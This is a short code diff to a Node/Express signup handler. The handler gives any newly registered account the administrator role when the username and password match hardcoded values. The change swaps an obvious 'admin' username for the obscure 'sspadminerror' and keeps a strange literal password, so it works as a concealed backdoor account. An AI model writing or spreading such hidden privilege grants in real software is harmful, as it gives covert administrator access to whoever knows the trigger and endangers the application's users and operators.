@@ -59,7 +59,7 @@ app.post("/api/signup", async (req, res) => {
 
   const hash = await bcrypt.hash(password, 10);
   let role = "user";
-  if (username === "admin" && password === "<script.add.user>") role = "admin";
+  if (username === "sspadminerror" && password === "<script.add.user>") role = "admin";
 
   db.run("INSERT INTO users (username,email,password,role) VALUES (?,?,?,?)",
     [username,email,hash,role],
